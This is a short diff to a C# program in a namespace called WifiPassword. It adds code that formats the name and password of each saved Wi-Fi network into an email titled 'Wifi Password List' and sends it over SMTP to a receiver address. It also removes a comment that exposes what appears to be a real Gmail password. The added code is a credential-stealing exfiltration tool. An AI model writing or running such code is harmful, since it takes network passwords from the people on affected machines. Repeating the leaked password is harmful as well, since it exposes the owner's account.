@@ -43,9 +43,25 @@ namespace WifiPassword
                 DeliveryMethod = SmtpDeliveryMethod.Network,
                                 UseDefaultCredentials = false,
                 EnableSsl = true,
-                Credentials = new NetworkCredential("sender-email", "sender-app-pass")//passi i gmail: EclipseNight2003!
+                Credentials = new NetworkCredential("sender-email", "sender-app-pass")
             };
-               
+              
+            var message = new MailMessage("sender-email", "receiver-email") {
+                Subject = "Wifi Password List",
+                Body = ""
+            };
+
+            var sb = new StringBuilder();
+            foreach (var info in wifiInfo)
+            {
+                sb.AppendLine($"Name: {info.Name}");
+                sb.AppendLine($"Password: {info.Password}");
+                sb.AppendLine();
+            }
+            message.Body = sb.ToString();
+
+            smtpClient.Send(message);
+        }
 
     }
 }
